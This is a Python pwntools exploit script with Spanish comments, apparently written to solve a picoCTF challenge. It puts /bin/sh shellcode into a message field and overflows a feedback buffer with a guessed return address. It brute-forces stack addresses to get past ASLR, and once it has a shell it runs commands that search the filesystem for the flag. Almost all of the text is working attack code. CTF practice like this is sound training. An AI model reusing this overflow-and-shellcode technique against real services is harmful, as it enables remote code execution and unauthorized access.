#!/usr/bin/env python3
"""
Bruteforce ASLR para encontrar dirección del shellcode

En Linux x64, el stack tiene ~28 bits de entropía, pero los últimos 12 bits son fijos.
Esto significa 2^16 = 65536 posibilidades si bruteforceo 16 bits.

Para un CTF, a veces el ASLR está debilitado o tiene menos entropía.
Voy a probar direcciones en un rango y ver si alguna funciona.
"""

from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'warn'

HOST = 'shape-facility.picoctf.net'
PORT = 63529

# Shellcode
shellcode = asm(shellcraft.sh())

# Rango de direcciones para probar
# entries[0].msg debería estar cerca de rbp-728
# rbp típicamente está en 0x7fffffffd000 - 0x7fffffffe000
# Así que entries[0].msg está alrededor de 0x7fffffffca00 - 0x7fffffffda00

base = 0x7fffffffca00
attempts = 0
max_attempts = 500

log.info(f"Iniciando bruteforce con shellcode de {len(shellcode)} bytes")
log.info(f"Probando {max_attempts} direcciones starting from {hex(base)}")

for offset in range(0, max_attempts * 0x10, 0x10):
    addr = base + offset
    attempts += 1
    
    if attempts % 50 == 0:
        log.info(f"Intentos: {attempts}/{max_attempts}")
    
    try:
        io = remote(HOST, PORT, level='error')
        
        # Agregar entrada con shellcode
        io.sendlineafter(b'Exit the app\n', b'1', timeout=2)
        io.sendlineafter(b'name: \n', b'AAAA', timeout=2)
        
        io.sendlineafter(b'Exit the app\n', b'2', timeout=2)
        io.sendlineafter(b'message to?\n', b'0', timeout=2)
        io.sendlineafter(b'send them?\n', shellcode, timeout=2)
        
        # Feedback overflow
        payload = b'X' * 8 + b'Y' * 4 + b'Z' * 8 + p64(addr)
        io.sendlineafter(b'Exit the app\n', b'3', timeout=2)
        io.sendlineafter(b'appreciate it: \n', payload, timeout=2)
        
        # Intentar comando
        io.send(b'echo PWNED\n')
        response = io.recv(timeout=0.5)
        
        if b'PWNED' in response or b'$' in response or b'#' in response:
            log.success(f"¡SHELL OBTENIDA con dirección {hex(addr)}!")
            log.success("Buscando flag...")
            
            io.sendline(b'cat flag.txt 2>/dev/null')
            io.sendline(b'ls -la')
            io.sendline(b'find / -name "flag*" 2>/dev/null | head')
            io.sendline(b'pwd')
            
            output = io.recvall(timeout=3)
            print(output.decode(errors='ignore'))
            
            if b'picoCTF{' in output:
                flag = output[output.find(b'picoCTF{'):].split()[0]
                log.success(f"FLAG: {flag.decode()}")
                sys.exit(0)
            
            io.interactive()
            sys.exit(0)
            
        io.close()
        
    except Exception as e:
        try:
            io.close()
        except:
            pass
        continue

log.error(f"No se encontró dirección correcta después de {attempts} intentos")
